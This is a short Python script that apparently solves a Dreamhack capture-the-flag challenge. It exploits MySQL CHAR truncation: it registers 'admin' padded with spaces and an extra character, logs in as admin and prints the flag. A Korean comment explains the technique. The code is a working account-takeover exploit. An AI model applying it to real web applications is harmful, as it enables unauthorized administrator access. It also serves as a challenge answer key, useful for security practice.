from bs4 import BeautifulSoup
import requests

URL = "http://host3.dreamhack.games:15996"
JOIN_URI = "/join.php"
TMITTER_URI = "/tmitter.php"
PAYLOAD01 = {'id':'admin'+(' ' * 32)+'1', 'ps':'adminadmin'}
PAYLOAD02 = {'id':'admin', 'ps': 'adminadmin'}

requests.post(URL + JOIN_URI, data=PAYLOAD01)

resp = requests.post(URL+ TMITTER_URI, data=PAYLOAD02)

soup = BeautifulSoup(resp.content,"html.parser")
pre = soup.find('textarea')
flag = pre.contents[0]
print(flag)

'''
MySQL에서 varchar가 아닌 char를 사용할 경우 'admin' == 'admin                        <기타 문자열>'
핵심은 자료형이 char이고 변수의 실제 크기보다 더 큰 공백 + 문자열을 주면서 문자열이 범위에서 완전히 벗어나게 처리하는것.
'''